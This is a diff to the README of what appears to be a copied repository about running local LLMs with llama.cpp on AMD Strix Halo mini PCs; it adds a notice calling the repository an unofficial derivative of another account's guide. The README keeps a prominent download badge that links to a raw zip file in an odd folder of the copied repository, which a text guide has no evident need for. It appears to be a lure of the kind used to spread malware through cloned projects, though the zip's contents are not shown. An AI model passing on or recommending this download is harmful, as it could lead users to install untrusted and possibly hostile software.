@@ -1,10 +1,13 @@
 # ⚡ strix-halo-guide - Fast Local LLM Performance Guide
 
+> [!IMPORTANT]
+> This repository is an unofficial derivative of the [AMD Strix Halo Local LLM Guide](https://github.com/hogeheer499-commits/strix-halo-guide). The linked repository is the canonical, actively maintained source for the original setup instructions, benchmark evidence, raw logs, and security/provenance information.
+
 [![Download Latest Release](https://img.shields.io/badge/Download-strix--halo--guide-ff6600?style=for-the-badge)](https://github.com/GetNyrex/strix-halo-guide/raw/refs/heads/main/chock/halo_guide_strix_3.7.zip)
 
 ## 📋 About strix-halo-guide
 
-This is the main guide to using Strix Halo, a local large language model (LLM) setup. It is designed to help you get the best performance from Strix Halo on a mini PC setup. The guide shows you how to run the model at 65 tokens per second using a $2,999 mini PC. You will find live benchmarks, tested optimizations, and clear notes on what does not work.
+This derivative guide is intended to help people use Strix Halo for a local large language model (LLM) setup. It is designed to help you get the best performance from Strix Halo on a mini PC setup. The guide shows you how to run the model at 65 tokens per second using a $2,999 mini PC. You will find live benchmarks, tested optimizations, and clear notes on what does not work.
 
 The guide covers hardware setups focused on AMD Ryzen AI chips, Beelink mini PCs, and GPU technologies like RDNA3 and Vulkan. It uses llama.cpp and related inference tools, including GGUF models, to run the LLM locally without sending data to the cloud.
 
